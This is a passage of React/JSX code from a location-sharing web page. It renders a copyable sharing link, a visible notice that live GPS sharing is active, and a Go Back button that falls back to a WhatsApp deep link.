              <div style={{ flex: 1, minWidth: 0, borderRadius: 6, padding: "8px 10px", fontSize: 11, fontFamily: "'Share Tech Mono', monospace", color: "rgba(212,168,67,0.4)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", background: "rgba(0,0,0,0.35)", border: "1px solid rgba(122,92,40,0.3)" }}>
                {sharingLink}
              </div>
              <button
                onClick={handleCopyLink}
                style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: "pointer", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.04em",
                  ...(linkCopied
                    ? { background: "rgba(16,130,60,0.2)", border: "1px solid rgba(16,185,129,0.35)", color: "#6ee7b7" }
                    : { background: "linear-gradient(135deg,#8B6914,#C8922A)", color: "#1a0c05" }) }}
              >
                {linkCopied ? <Check style={{ width: 13, height: 13 }} /> : <Copy style={{ width: 13, height: 13 }} />}
                {linkCopied ? "Copied!" : "Copy"}
              </button>
            </div>
          </div>

          {/* ── Live sharing active notice ── */}
          <div style={{ borderRadius: 8, padding: "12px 14px", background: "linear-gradient(135deg,#0e2010 0%,#142816 100%)", border: "1.5px solid rgba(34,150,80,0.28)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
              <CheckCircle style={{ width: 14, height: 14, color: "#4ade80", flexShrink: 0 }} />
              <p style={{ fontSize: 11, fontWeight: 700, color: "#4ade80", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>LIVE SHARING ACTIVE</p>
            </div>
            <p style={{ fontSize: 12, color: "rgba(180,220,180,0.45)", margin: 0, lineHeight: 1.5 }}>
              Keep this page open for continuous browser sharing. Android can stop web GPS if Chrome is removed from recent apps; use the PhoneLink mobile app for background sharing while you use other apps.
            </p>
          </div>

          {/* ── Go back ── */}
          <button
            style={{ width: "100%", borderRadius: 8, padding: "12px", fontSize: 13, fontWeight: 600, color: "rgba(212,168,67,0.4)", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "rgba(122,92,40,0.08)", border: "1.5px solid rgba(122,92,40,0.2)", cursor: "pointer", fontFamily: "Georgia, serif", letterSpacing: "0.04em" }}
            onClick={() => {
              if (window.history.length > 1) { window.history.back(); } else {
                const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
                document.body.appendChild(a); a.click(); setTimeout(() => document.body.removeChild(a), 300);
              }
            }}
          >
            <ArrowLeft style={{ width: 16, height: 16 }} /> Go Back
          </button>
        </div>
      </div>
    );
  }

  // ── Loading / idle ─────────────────────────────────────────────────────────────
  if (isLoading || (state === "idle" && displayPhase !== "contacts")) {
    return <div className="bg-background" style={fullHeight} />;
  }

  // Fallback: displayPhase === "main" but GPS not yet resolved.
  // Show nothing — the useEffect above will push forward within 800 ms.
  return <div className="bg-background" style={fullHeight} />;
}
